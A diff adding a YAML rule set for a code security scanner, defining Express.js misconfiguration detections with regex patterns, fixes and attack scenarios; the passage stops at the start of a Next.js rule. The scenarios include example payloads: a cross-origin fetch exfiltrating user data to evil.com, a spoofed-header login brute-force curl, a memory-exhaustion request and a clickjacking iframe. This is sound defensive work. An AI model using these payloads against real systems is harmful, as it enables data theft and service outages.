@@ -1,0 +1,1498 @@
+rules:
+  # ============================================================
+  # EXPRESS.JS RULES (FW-EXPRESS-001 to FW-EXPRESS-004)
+  # ============================================================
+
+  - rule_id: "FW-EXPRESS-001"
+    title: "Missing Helmet Middleware in Express Application"
+    description: >
+      Detects Express.js applications that initialize an Express server without
+      applying the Helmet middleware. Helmet sets various HTTP security headers
+      (X-Content-Type-Options, Strict-Transport-Security, X-Frame-Options, etc.)
+      that protect against clickjacking, MIME-type sniffing, and other common
+      web vulnerabilities. Omitting Helmet leaves the application exposed to
+      a wide range of client-side attacks by default.
+    language: javascript
+    category: framework_misuse
+    severity: High
+    confidence: 0.88
+    cwe: CWE-693
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - express
+      - helmet
+      - security-headers
+      - misconfiguration
+      - node.js
+      - http-headers
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'const\s+app\s*=\s*express\s*\(\s*\)'
+        description: "Standard Express app initialization without helmet usage in file"
+      - type: regex
+        pattern: 'var\s+app\s*=\s*express\s*\(\s*\)'
+        description: "Legacy var-based Express app initialization"
+      - type: regex
+        pattern: 'let\s+app\s*=\s*express\s*\(\s*\)'
+        description: "Let-based Express app initialization"
+      - type: regex
+        pattern: 'express\.Router\s*\(\s*\)'
+        description: "Router-level configuration without helmet applied at app level"
+      - type: regex
+        pattern: 'app\.listen\s*\(\s*\d+'
+        description: "Express server listening without prior helmet configuration"
+      - type: regex
+        pattern: 'module\.exports\s*=\s*app'
+        description: "App export without helmet middleware in module"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*express\.static'
+        description: "Static file serving without helmet protection headers"
+      - type: regex
+        pattern: 'createServer\s*\(\s*app\s*\)'
+        description: "HTTP server creation with Express app missing helmet"
+    anti_patterns:
+      - 'app\.use\s*\(\s*helmet\s*\(\s*\)\s*\)'
+      - 'app\.use\s*\(\s*helmet\s*\(\s*\{[^}]*\}\s*\)\s*\)'
+      - 'require\s*\(\s*["\x27]helmet["\x27]\s*\)'
+      - 'import\s+helmet\s+from\s+["\x27]helmet["\x27]'
+      - 'app\.use\s*\(\s*helmet\.'
+      - 'helmet\.contentSecurityPolicy'
+      - 'helmet\.hsts'
+      - 'helmet\.frameguard'
+      - 'helmet\.xssFilter'
+      - 'helmet\.noSniff'
+      - 'app\.set\s*\(\s*["\x27]x-powered-by["\x27]\s*,\s*false\s*\)'
+      - 'app\.disable\s*\(\s*["\x27]x-powered-by["\x27]\s*\)'
+      - 'res\.setHeader\s*\(\s*["\x27]X-Content-Type-Options["\x27]'
+      - 'res\.setHeader\s*\(\s*["\x27]Strict-Transport-Security["\x27]'
+      - 'lusca\s*\('
+    bypass_variants:
+      - description: "Helmet imported but never used as middleware"
+        pattern: 'require\s*\(\s*["\x27]helmet["\x27]\s*\)(?![\s\S]*app\.use\s*\(\s*helmet)'
+      - description: "Helmet applied only to specific routes, not globally"
+        pattern: 'app\.(get|post)\s*\([^,]+,\s*helmet\s*\(\s*\)'
+      - description: "Helmet configured with all protections disabled"
+        pattern: 'helmet\s*\(\s*\{\s*contentSecurityPolicy\s*:\s*false\s*,\s*hsts\s*:\s*false'
+    evasion_indicators:
+      - "Wrapping Express app in custom server without middleware"
+      - "Using raw http.createServer instead of Express middleware chain"
+      - "Splitting app and server into separate files to obscure middleware absence"
+    encoding_variants:
+      - type: "dynamic_require"
+        pattern: 'require\s*\(\s*["\x27]hel["\x27]\s*\+\s*["\x27]met["\x27]\s*\)'
+      - type: "variable_indirection"
+        pattern: 'const\s+\w+\s*=\s*["\x27]helmet["\x27];\s*require\s*\(\s*\w+\s*\)'
+    multi_function_chain_patterns:
+      - "express() -> app.use(cors()) -> app.use(bodyParser()) -> app.listen() [no helmet]"
+      - "express() -> router.use() -> app.use(router) -> app.listen() [no helmet at app level]"
+      - "express() -> app.use(session()) -> app.use(passport()) -> app.listen() [no helmet]"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Missing security headers enable clickjacking and MIME-sniff attacks on all users"
+    business_logic_indicator:
+      financial_impact: false
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request from client"
+        sink: "HTTP response missing security headers"
+        through: "Express middleware chain"
+    impact: |
+      Without Helmet, the Express application serves responses lacking critical
+      HTTP security headers. Attackers can exploit this to perform clickjacking
+      attacks (missing X-Frame-Options), MIME-type confusion (missing
+      X-Content-Type-Options), and downgrade attacks (missing HSTS). This is
+      classified as a security misconfiguration that affects every response.
+    remediation: |
+      Install and apply Helmet middleware globally:
+
+      ```javascript
+      const helmet = require('helmet');
+      const express = require('express');
+      const app = express();
+
+      // Apply helmet as the first middleware
+      app.use(helmet());
+
+      // For stricter CSP:
+      app.use(helmet({
+        contentSecurityPolicy: {
+          directives: {
+            defaultSrc: ["'self'"],
+            scriptSrc: ["'self'"],
+            styleSrc: ["'self'", "'unsafe-inline'"],
+            imgSrc: ["'self'", "data:"],
+          },
+        },
+        hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
+      }));
+      ```
+    references:
+      - "https://helmetjs.github.io/"
+      - "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+      - "https://expressjs.com/en/advanced/best-practice-security.html"
+      - "https://cwe.mitre.org/data/definitions/693.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'express\s*\(\s*\)'
+        - 'app\.use\s*\('
+        - 'app\.listen\s*\('
+        - 'module\.exports'
+      taint_source_indicators:
+        - 'req\.body'
+        - 'req\.params'
+        - 'req\.query'
+      taint_sink_indicators:
+        - 'res\.send\s*\('
+        - 'res\.json\s*\('
+        - 'res\.render\s*\('
+      sanitization_patterns:
+        - 'helmet\s*\('
+        - 'res\.setHeader\s*\(\s*["\x27]X-Frame-Options["\x27]'
+        - 'res\.setHeader\s*\(\s*["\x27]Content-Security-Policy["\x27]'
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_coverage)"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        An attacker crafts a malicious website that embeds the vulnerable Express
+        application in an iframe. Because X-Frame-Options is not set, the victim
+        interacts with the framed application unknowingly. The attacker overlays
+        transparent UI elements to trick the victim into performing unintended
+        actions (clickjacking). Additionally, the attacker exploits missing
+        X-Content-Type-Options to serve a malicious file that the browser
+        incorrectly interprets as executable JavaScript.
+      example_payload: '<iframe src="https://vulnerable-app.com/transfer" style="opacity:0;position:absolute;"></iframe>'
+      attacker_objective: "Perform clickjacking attacks and MIME-type confusion to execute malicious content"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "low"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-EXPRESS-002"
+        - "FW-EXPRESS-003"
+        - "FW-ASPNET-004"
+
+  - rule_id: "FW-EXPRESS-002"
+    title: "Disabled or Overly Permissive CORS Configuration in Express"
+    description: >
+      Detects Express.js applications that configure CORS (Cross-Origin Resource
+      Sharing) with a wildcard origin or reflect any origin without validation.
+      This allows any website to make credentialed cross-origin requests to the
+      application, enabling data theft, CSRF bypass, and unauthorized API access
+      from attacker-controlled domains.
+    language: javascript
+    category: framework_misuse
+    severity: High
+    confidence: 0.90
+    cwe: CWE-942
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - express
+      - cors
+      - misconfiguration
+      - cross-origin
+      - api-security
+      - node.js
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'cors\s*\(\s*\{\s*origin\s*:\s*["\x27]\*["\x27]'
+        description: "CORS configured with wildcard origin string"
+      - type: regex
+        pattern: 'cors\s*\(\s*\{\s*origin\s*:\s*true'
+        description: "CORS configured to reflect all origins"
+      - type: regex
+        pattern: 'cors\s*\(\s*\)'
+        description: "CORS applied with default permissive configuration"
+      - type: regex
+        pattern: 'res\.setHeader\s*\(\s*["\x27]Access-Control-Allow-Origin["\x27]\s*,\s*["\x27]\*["\x27]\s*\)'
+        description: "Manual wildcard ACAO header"
+      - type: regex
+        pattern: 'res\.header\s*\(\s*["\x27]Access-Control-Allow-Origin["\x27]\s*,\s*["\x27]\*["\x27]\s*\)'
+        description: "Manual wildcard ACAO via res.header"
+      - type: regex
+        pattern: 'Access-Control-Allow-Origin["\x27]\s*,\s*req\.(headers\.origin|get\s*\(\s*["\x27]origin["\x27]\s*\))'
+        description: "Reflecting request origin directly in ACAO header"
+      - type: regex
+        pattern: 'cors\s*\(\s*\{\s*origin\s*:\s*\(?\s*\w+\s*(?:,\s*\w+)?\s*\)?\s*=>\s*\{?\s*\w+\s*\(\s*null\s*,\s*true\s*\)'
+        description: "CORS callback always returning true"
+      - type: regex
+        pattern: 'credentials\s*:\s*true[\s\S]{0,100}origin\s*:\s*["\x27]\*["\x27]'
+        description: "Wildcard origin combined with credentials flag"
+    anti_patterns:
+      - 'origin\s*:\s*\[\s*["\x27]https?://[\w.-]+["\x27]'
+      - 'origin\s*:\s*["\x27]https?://[\w.-]+["\x27]'
+      - 'origin\s*:\s*\/[\^]'
+      - 'allowedOrigins\s*=\s*\['
+      - 'whitelist\s*=\s*\['
+      - 'corsOptions\s*=\s*\{[^}]*origin\s*:\s*function'
+      - 'origin\s*:\s*\(origin\s*,\s*callback\)\s*=>\s*\{[\s\S]*whitelist'
+      - 'origin\s*:\s*\(origin\s*,\s*callback\)\s*=>\s*\{[\s\S]*allowedOrigins'
+      - 'if\s*\(\s*allowedOrigins\.includes\s*\('
+      - 'if\s*\(\s*whitelist\.indexOf\s*\('
+      - 'process\.env\.CORS_ORIGIN'
+      - 'process\.env\.ALLOWED_ORIGINS'
+      - 'cors\s*\(\s*\{\s*origin\s*:\s*false'
+      - 'origin\s*:\s*\[\s*process\.env'
+      - 'corsValidator\s*\('
+    bypass_variants:
+      - description: "Origin validation using substring match instead of exact match"
+        pattern: 'origin\.includes\s*\(\s*["\x27][\w.-]+["\x27]\s*\)'
+      - description: "Origin validation using endsWith allowing subdomain bypass"
+        pattern: 'origin\.endsWith\s*\(\s*["\x27]\.[\w.-]+["\x27]\s*\)'
+      - description: "Regex origin validation with unescaped dot allowing bypass"
+        pattern: 'origin\.match\s*\(\s*\/[\w]*\.[\w]+\/'
+    evasion_indicators:
+      - "CORS configuration split across multiple middleware files"
+      - "Dynamic origin from environment variable set to wildcard"
+      - "CORS headers set in reverse proxy but not validated in app"
+    encoding_variants:
+      - type: "header_concatenation"
+        pattern: '["\x27]Access-Control-Allow-["\x27]\s*\+\s*["\x27]Origin["\x27]'
+      - type: "variable_header"
+        pattern: 'const\s+\w+\s*=\s*["\x27]Access-Control-Allow-Origin["\x27];\s*res\.\w+\s*\(\s*\w+\s*,\s*["\x27]\*["\x27]'
+    multi_function_chain_patterns:
+      - "require('cors') -> cors({ origin: '*' }) -> app.use(cors) -> credential routes"
+      - "app.use((req,res,next) => { res.header('ACAO','*') }) -> auth routes"
+      - "cors() -> app.options('*', cors()) -> app.use(cors()) -> sensitive endpoints"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Overly permissive CORS enables cross-origin data theft from any authenticated session"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Origin header in HTTP request"
+        sink: "Access-Control-Allow-Origin response header"
+        through: "CORS middleware configuration"
+    impact: |
+      An overly permissive CORS configuration allows any website to make
+      authenticated cross-origin requests to the API. When combined with
+      credentials: true, attackers can steal sensitive user data, perform
+      actions on behalf of users, and bypass CSRF protections. This
+      effectively turns every authenticated endpoint into an exploitable
+      attack surface.
+    remediation: |
+      Configure CORS with an explicit whitelist of allowed origins:
+
+      ```javascript
+      const cors = require('cors');
+      const allowedOrigins = [
+        'https://app.example.com',
+        'https://admin.example.com'
+      ];
+
+      app.use(cors({
+        origin: function(origin, callback) {
+          if (!origin || allowedOrigins.includes(origin)) {
+            callback(null, true);
+          } else {
+            callback(new Error('Not allowed by CORS'));
+          }
+        },
+        credentials: true,
+        methods: ['GET', 'POST', 'PUT', 'DELETE'],
+        allowedHeaders: ['Content-Type', 'Authorization'],
+      }));
+      ```
+    references:
+      - "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"
+      - "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing"
+      - "https://portswigger.net/web-security/cors"
+      - "https://cwe.mitre.org/data/definitions/942.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'require\s*\(\s*["\x27]cors["\x27]\s*\)'
+        - 'app\.use\s*\(\s*cors'
+        - 'app\.options\s*\('
+        - 'Access-Control-'
+      taint_source_indicators:
+        - 'req\.headers\.origin'
+        - 'req\.get\s*\(\s*["\x27]origin["\x27]\s*\)'
+        - 'req\.header\s*\(\s*["\x27]origin["\x27]\s*\)'
+      taint_sink_indicators:
+        - 'res\.setHeader\s*\(\s*["\x27]Access-Control-Allow-Origin["\x27]'
+        - 'res\.header\s*\(\s*["\x27]Access-Control-Allow-Origin["\x27]'
+      sanitization_patterns:
+        - 'allowedOrigins\.includes\s*\('
+        - 'whitelist\.indexOf\s*\('
+        - 'origin\s*===\s*["\x27]https://'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (credentials_enabled ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An attacker hosts a malicious page at evil.com. When a victim who is
+        logged into the target application visits evil.com, JavaScript on the
+        attacker page sends a fetch() request to the API with credentials:
+        'include'. Because the API reflects any origin with credentials: true,
+        the browser allows the attacker page to read the response containing
+        the victim's personal data, tokens, and account information.
+      example_payload: "fetch('https://api.vulnerable.com/user/profile', {credentials:'include'}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil.com/steal',JSON.stringify(d)))"
+      attacker_objective: "Steal authenticated user data and perform cross-origin actions on behalf of the victim"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-EXPRESS-001"
+        - "FW-SPRING-003"
+        - "FW-ASPNET-005"
+
+  - rule_id: "FW-EXPRESS-003"
+    title: "Trust Proxy Misconfiguration in Express Application"
+    description: >
+      Detects Express.js applications that improperly configure or fail to
+      configure the 'trust proxy' setting. When Express runs behind a reverse
+      proxy (nginx, AWS ALB, Cloudflare), incorrect trust proxy settings can
+      lead to IP spoofing, rate limit bypass, and incorrect protocol detection.
+      Setting trust proxy to true without specifying hops trusts all proxies,
+      allowing X-Forwarded-For header manipulation.
+    language: javascript
+    category: framework_misuse
+    severity: High
+    confidence: 0.85
+    cwe: CWE-348
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - express
+      - trust-proxy
+      - ip-spoofing
+      - rate-limiting
+      - misconfiguration
+      - node.js
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*true\s*\)'
+        description: "Trust proxy set to true without specifying hop count"
+      - type: regex
+        pattern: 'app\.enable\s*\(\s*["\x27]trust\s+proxy["\x27]\s*\)'
+        description: "Trust proxy enabled globally via app.enable"
+      - type: regex
+        pattern: 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*["\x27]\*["\x27]\s*\)'
+        description: "Trust proxy set to wildcard"
+      - type: regex
+        pattern: 'req\.ip(?!\s*===)'
+        description: "Using req.ip without proper trust proxy validation"
+      - type: regex
+        pattern: 'req\.ips'
+        description: "Using req.ips array which depends on trust proxy setting"
+      - type: regex
+        pattern: 'req\.hostname(?!\s*===)'
+        description: "Using req.hostname which trusts X-Forwarded-Host header"
+      - type: regex
+        pattern: 'req\.protocol(?!\s*===)'
+        description: "Using req.protocol which trusts X-Forwarded-Proto header"
+      - type: regex
+        pattern: 'x-forwarded-for["\x27]\s*\]'
+        description: "Directly reading X-Forwarded-For header without trust proxy config"
+    anti_patterns:
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*1\s*\)'
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*2\s*\)'
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*["\x27]loopback["\x27]\s*\)'
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*["\x27]127\.0\.0\.1["\x27]\s*\)'
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*["\x27]10\.\d+'
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*["\x27]172\.'
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*["\x27]192\.168\.'
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*false\s*\)'
+      - 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*["\x27]uniquelocal["\x27]\s*\)'
+      - 'trust\s*proxy\s*.*\s*function\s*\('
+      - 'proxyAddr\s*\('
+      - 'ipRangeCheck\s*\('
+      - 'cidr\s*\('
+      - 'proxy-addr'
+      - 'net\.isIP\s*\('
+    bypass_variants:
+      - description: "Trust proxy set via environment variable without validation"
+        pattern: 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*process\.env\.\w+\s*\)'
+      - description: "Trust proxy configured but rate limiter uses wrong IP source"
+        pattern: 'keyGenerator\s*:\s*\(?\s*req\s*\)?\s*=>\s*req\.headers\s*\[\s*["\x27]x-forwarded-for["\x27]\s*\]'
+      - description: "Trust proxy number too high allowing spoofed IPs"
+        pattern: 'app\.set\s*\(\s*["\x27]trust\s+proxy["\x27]\s*,\s*[5-9]\d*\s*\)'
+    evasion_indicators:
+      - "Setting trust proxy in a separate configuration file"
+      - "Using environment variables that resolve to overly permissive values"
+      - "Proxy configuration managed by orchestration layer not visible in app code"
+    encoding_variants:
+      - type: "string_concatenation"
+        pattern: '["\x27]trust["\x27]\s*\+\s*["\x27]\s+proxy["\x27]'
+      - type: "variable_key"
+        pattern: 'const\s+\w+\s*=\s*["\x27]trust proxy["\x27];\s*app\.set\s*\(\s*\w+'
+    multi_function_chain_patterns:
+      - "app.set('trust proxy', true) -> rateLimit({ keyGenerator: req => req.ip }) -> IP bypass"
+      - "app.enable('trust proxy') -> req.ip in access log -> IP spoofing in logs"
+      - "app.set('trust proxy', true) -> req.protocol check -> protocol downgrade"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "IP spoofing bypasses rate limiting and IP-based access controls"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: false
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "X-Forwarded-For HTTP header"
+        sink: "req.ip / req.ips used in authorization or rate limiting"
+        through: "Express trust proxy resolution"
+    impact: |
+      When trust proxy is set to true without specifying the number of proxy
+      hops, Express trusts all values in the X-Forwarded-For chain. An attacker
+      can inject arbitrary IP addresses into this header, bypassing rate
+      limiters, IP-based access controls, geo-restrictions, and audit logging.
+      This can enable brute-force attacks, account takeover, and forensic
+      evidence tampering.
+    remediation: |
+      Configure trust proxy with the exact number of proxy hops or specific
+      trusted proxy addresses:
+
+      ```javascript
+      // Option 1: Specify number of hops (e.g., 1 for single reverse proxy)
+      app.set('trust proxy', 1);
+
+      // Option 2: Specify trusted proxy addresses
+      app.set('trust proxy', 'loopback, 10.0.0.0/8');
+
+      // Option 3: Custom trust function
+      app.set('trust proxy', function(ip) {
+        return ip === '127.0.0.1' || ip === '10.0.0.1';
+      });
+      ```
+    references:
+      - "https://expressjs.com/en/guide/behind-proxies.html"
+      - "https://portswigger.net/daily-swig/ip-spoofing"
+      - "https://cwe.mitre.org/data/definitions/348.html"
+      - "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'app\.set\s*\('
+        - 'trust\s+proxy'
+        - 'req\.ip'
+        - 'x-forwarded-for'
+      taint_source_indicators:
+        - 'req\.headers\s*\[\s*["\x27]x-forwarded-for["\x27]\s*\]'
+        - 'req\.ip'
+        - 'req\.ips'
+      taint_sink_indicators:
+        - 'rateLimit\s*\('
+        - 'ipFilter\s*\('
+        - 'accessControl\s*\('
+      sanitization_patterns:
+        - 'app\.set\s*\(\s*["\x27]trust proxy["\x27]\s*,\s*\d\s*\)'
+        - 'net\.isIP\s*\('
+        - 'ipRangeCheck\s*\('
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (rate_limiting_present ? 1.5 : 1.0)"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        An application behind nginx uses trust proxy = true and rate limiting
+        based on req.ip. An attacker sends requests with a forged
+        X-Forwarded-For: 1.2.3.4 header, changing the IP each request.
+        The rate limiter treats each request as from a different client,
+        allowing unlimited login attempts for credential brute-forcing.
+      example_payload: "curl -H 'X-Forwarded-For: 1.2.3.4' https://target.com/api/login -d '{\"user\":\"admin\",\"pass\":\"test\"}'"
+      attacker_objective: "Bypass rate limiting and IP-based access controls via X-Forwarded-For spoofing"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-EXPRESS-001"
+        - "FW-EXPRESS-002"
+
+  - rule_id: "FW-EXPRESS-004"
+    title: "Body-Parser Size Limit Missing or Excessive in Express"
+    description: >
+      Detects Express.js applications that use body-parser or express.json()
+      without configuring a request body size limit, or with an excessively
+      large limit. Without a limit, attackers can send extremely large payloads
+      causing denial of service through memory exhaustion, event loop blocking,
+      or disk consumption.
+    language: javascript
+    category: framework_misuse
+    severity: Medium
+    confidence: 0.82
+    cwe: CWE-770
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - express
+      - body-parser
+      - dos
+      - resource-exhaustion
+      - misconfiguration
+      - node.js
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'app\.use\s*\(\s*express\.json\s*\(\s*\)\s*\)'
+        description: "express.json() without size limit configuration"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*express\.urlencoded\s*\(\s*\{[^}]*\}\s*\)\s*\)'
+        description: "express.urlencoded without explicit limit"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*bodyParser\.json\s*\(\s*\)\s*\)'
+        description: "bodyParser.json() without size limit"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*bodyParser\.urlencoded\s*\(\s*\{[^}]*\}\s*\)\s*\)'
+        description: "bodyParser.urlencoded without explicit limit"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*bodyParser\.raw\s*\(\s*\)\s*\)'
+        description: "bodyParser.raw() without size limit"
+      - type: regex
+        pattern: 'limit\s*:\s*["\x27]\d{2,}mb["\x27]'
+        description: "Excessively large body size limit (tens of MB or more)"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*bodyParser\.text\s*\(\s*\)\s*\)'
+        description: "bodyParser.text() without size limit"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*express\.raw\s*\(\s*\)\s*\)'
+        description: "express.raw() without size limit"
+    anti_patterns:
+      - 'express\.json\s*\(\s*\{\s*limit\s*:\s*["\x27]\d+kb["\x27]'
+      - 'express\.json\s*\(\s*\{\s*limit\s*:\s*["\x27][12]mb["\x27]'
+      - 'bodyParser\.json\s*\(\s*\{\s*limit\s*:\s*["\x27]\d+kb["\x27]'
+      - 'bodyParser\.json\s*\(\s*\{\s*limit\s*:\s*["\x27][12]mb["\x27]'
+      - 'limit\s*:\s*["\x27]100kb["\x27]'
+      - 'limit\s*:\s*["\x27]500kb["\x27]'
+      - 'limit\s*:\s*["\x27]1mb["\x27]'
+      - 'payloadTooLarge'
+      - 'content-length.*max'
+      - 'maxFieldSize'
+      - 'maxFileSize'
+      - 'multer\s*\(\s*\{\s*limits'
+      - 'busboy\s*\(\s*\{\s*limits'
+      - 'express-fileupload.*limits'
+      - 'parameterLimit\s*:'
+    bypass_variants:
+      - description: "Limit set on JSON but not on URL-encoded or raw bodies"
+        pattern: 'express\.json\s*\(\s*\{\s*limit[^)]+\}\s*\)[\s\S]{0,200}express\.urlencoded\s*\(\s*\{(?![\s\S]*limit)'
+      - description: "Limit set globally but overridden on specific routes"
+        pattern: 'router\.\w+\s*\([^,]+,\s*express\.json\s*\(\s*\{?\s*\}\s*\)'
+      - description: "Content-Type manipulation to bypass parser-specific limits"
+        pattern: 'express\.json\s*\(\s*\{[^}]*type\s*:\s*["\x27]\*\/\*["\x27]'
+    evasion_indicators:
+      - "Using raw request stream to bypass body-parser limits"
+      - "Chunked transfer encoding to circumvent content-length checks"
+      - "Sending compressed payloads that expand to large sizes"
+    encoding_variants:
+      - type: "gzip_bomb"
+        pattern: 'express\.json\s*\(\s*\{[^}]*inflate\s*:\s*true'
+      - type: "content_type_bypass"
+        pattern: 'type\s*:\s*["\x27]application\/.*["\x27]'
+    multi_function_chain_patterns:
+      - "express.json() -> no limit -> large POST body -> memory exhaustion"
+      - "bodyParser.raw() -> no limit -> binary upload -> disk exhaustion"
+      - "express.urlencoded() -> no parameterLimit -> hash collision DoS"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "DoS via resource exhaustion affects all users and services"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: false
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body (Content-Length unbounded)"
+        sink: "Node.js process memory / event loop"
+        through: "body-parser middleware"
+    impact: |
+      Without body size limits, attackers can send multi-gigabyte request
+      bodies that consume all available memory, causing the Node.js process
+      to crash with an out-of-memory error. This creates a denial of service
+      condition. Even with automatic restarts, sustained attacks can keep the
+      service unavailable. Large JSON payloads can also block the event loop
+      during parsing.
+    remediation: |
+      Configure appropriate size limits for all body parsers:
+
+      ```javascript
+      const express = require('express');
+      const app = express();
+
+      // Set strict size limits
+      app.use(express.json({ limit: '100kb' }));
+      app.use(express.urlencoded({
+        extended: true,
+        limit: '100kb',
+        parameterLimit: 50
+      }));
+
+      // For file uploads, use multer with limits
+      const multer = require('multer');
+      const upload = multer({
+        limits: {
+          fileSize: 5 * 1024 * 1024, // 5MB
+          files: 5,
+          fields: 20
+        }
+      });
+      ```
+    references:
+      - "https://expressjs.com/en/api.html#express.json"
+      - "https://github.com/expressjs/body-parser#options"
+      - "https://cwe.mitre.org/data/definitions/770.html"
+      - "https://owasp.org/www-community/attacks/Denial_of_Service"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'express\.json\s*\('
+        - 'bodyParser\.\w+\s*\('
+        - 'app\.use\s*\('
+        - 'express\.urlencoded\s*\('
+      taint_source_indicators:
+        - 'req\.body'
+        - 'req\.rawBody'
+      taint_sink_indicators:
+        - 'JSON\.parse\s*\('
+        - 'Buffer\.from\s*\('
+      sanitization_patterns:
+        - 'limit\s*:\s*["\x27]\d+kb["\x27]'
+        - 'limit\s*:\s*["\x27][12]mb["\x27]'
+        - 'maxFieldSize\s*:'
+    severity_scoring:
+      severity_weight: 6
+      risk_score_formula_hint: "severity_weight * confidence * (public_endpoint ? 1.5 : 1.0)"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        An attacker sends a POST request with a 500MB JSON body to an Express
+        API endpoint that uses express.json() without a size limit. The Node.js
+        process allocates memory to buffer and parse the entire body, exhausting
+        available RAM. The process crashes with a heap out-of-memory error,
+        causing service downtime for all users. The attacker automates this
+        with multiple concurrent requests to prevent recovery.
+      example_payload: "python -c \"import requests; requests.post('https://target.com/api/data', json={'x': 'A'*500000000})\""
+      attacker_objective: "Cause denial of service through memory exhaustion via unbounded request body parsing"
+    confidence_factors:
+      pattern_strength: "medium"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: false
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-EXPRESS-001"
+        - "FW-EXPRESS-002"
+
+  # ============================================================
+  # NEXT.JS RULES (FW-NEXT-001 to FW-NEXT-004)
+  # ============================================================
+
+  - rule_id: "FW-NEXT-001"
+    title: "Next.js API Route Without Authentication Check"
+    description: >
+      Detects Next.js API routes (pages/api/ or app/api/) that handle requests
+      without any form of authentication or authorization check. Unprotected
+      API routes expose server-side functionality directly to the internet,
+      allowing unauthorized access to data and operations. Next.js API routes
+      are publicly accessible by default and require explicit auth middleware.
+    language: javascript
+    category: framework_misuse
+    severity: High
+    confidence: 0.87
+    cwe: CWE-306
